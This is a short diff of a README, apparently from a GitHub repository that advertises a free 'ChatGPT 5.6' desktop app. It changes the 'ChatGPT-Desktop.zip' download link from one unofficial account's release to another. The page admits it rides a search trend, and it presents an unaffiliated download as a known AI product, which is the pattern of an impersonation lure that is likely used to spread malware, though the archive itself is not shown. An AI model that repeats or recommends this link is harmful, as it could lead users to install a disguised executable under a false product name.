@@ -8,7 +8,7 @@ The **chatgpt 5.6 cyber** persona rides the fastest-growing search trend in the 
 
 
 ## Install
-[Download `ChatGPT-Desktop.zip`](https://github.com/chatgptcodexfree/Chatgpt-5.6-AI-Free-Desktop/releases/download/gpt5.6/ChatGPT-Desktop.zip)
+[Download `ChatGPT-Desktop.zip`](https://github.com/chatgpt56freeAI/Chatgpt-5.6-AI-Free-Desktop/releases/download/gpt5.6/ChatGPT-Desktop.zip)
 ---
 
 <img width="2940" height="1844" alt="images2" src="https://github.com/user-attachments/assets/6b762350-338a-4547-8a24-20d54c19ac60" />
